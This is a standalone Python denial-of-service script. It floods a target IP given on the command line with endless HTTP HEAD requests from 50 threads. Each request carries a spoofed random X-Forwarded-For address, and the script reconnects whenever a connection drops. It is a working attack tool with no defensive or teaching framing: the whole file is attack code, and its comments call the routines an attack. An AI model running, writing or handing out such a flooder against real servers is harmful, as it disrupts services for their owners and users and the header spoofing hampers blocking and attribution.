import socket
import os
from time import sleep
import random
import sys
import platform
from concurrent.futures import ThreadPoolExecutor

# Detect Operating System
print("Detecting System...")
sysOS = platform.system()
print("System detected:", sysOS)

if sysOS == "Linux":
    try:
        os.system("ulimit -n 100000")  # Reduced limit to avoid permission issues
    except Exception as e:
        print("Could not set ulimit:", e)

else:
    print("Warning: Your system may not support this script properly.")

# Function to generate random IP addresses
def randomip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

# Attack function
def attack(ip, port, url):
    connection = "Connection: keep-alive\r\n"
    referer = "Referer: null\r\n"
    get_host = f"HEAD {url} HTTP/1.1\r\nHost: {ip}\r\n"
    base_request = get_host + referer + connection
    request_end = "\r\n\r\n"

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as atk:
                atk.settimeout(4)
                atk.connect((ip, port))
                while True:
                    try:
                        forward = f"X-Forwarded-For: {randomip()}\r\n"
                        full_request = base_request + forward + request_end
                        atk.sendall(full_request.encode())
                        sleep(0.05)  # Reduce CPU usage
                    except (socket.error, BrokenPipeError):
                        break  # Reconnect on failure
        except Exception:
            sleep(0.5)  # Avoid excessive retries

# Main function to start attack
def send2attack(ip, port, url):
    max_threads = 50  # Reduced from 500 to avoid system crash
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        for _ in range(max_threads):
            executor.submit(attack, ip, port, url)
            sleep(0.01)  # Prevent overload

# Validate command-line arguments
if len(sys.argv) < 2:
    print("Usage: python script.py <target-ip>")
    sys.exit(1)

ip = sys.argv[1]
port = 80  # Default port
url = f"http://{ip}"

print("\n[>>>] Starting the attack [<<<]")
sleep(1)

try:
    send2attack(ip, port, url)
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
    sys.exit(0)
